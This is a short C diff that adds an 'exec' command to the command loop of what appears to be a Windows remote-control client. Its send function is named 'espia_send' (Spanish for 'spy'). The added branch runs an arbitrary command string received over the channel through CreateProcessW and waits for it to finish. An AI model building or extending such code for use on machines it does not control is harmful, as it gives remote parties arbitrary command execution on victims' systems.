@@ -97,6 +97,17 @@ int main() {
                 StringCbCatW(notify, sizeof(notify), L"Failed");
                 espia_send(notify, wcslen(notify)*sizeof(WCHAR));
             }
+        } else if (wcscmp(cmd_buff, L"exec") == 0) {
+            STARTUPINFOW info;
+            ZeroMemory( &info, sizeof(info));
+            info.cb = sizeof(info);
+            PROCESS_INFORMATION procinfo;
+            ZeroMemory( &procinfo, sizeof(procinfo));
+            if (!CreateProcessW(NULL, cmd_arg, NULL, NULL, FALSE, 0, NULL, NULL, &info, &procinfo)) {
+                printf("Error: %d\n", GetLastError());
+            }
+            printf("Waiting..");
+            WaitForSingleObject( procinfo.hProcess, INFINITE );
         } else {
             espia_send(recv_buffw, cmd_size);
         }
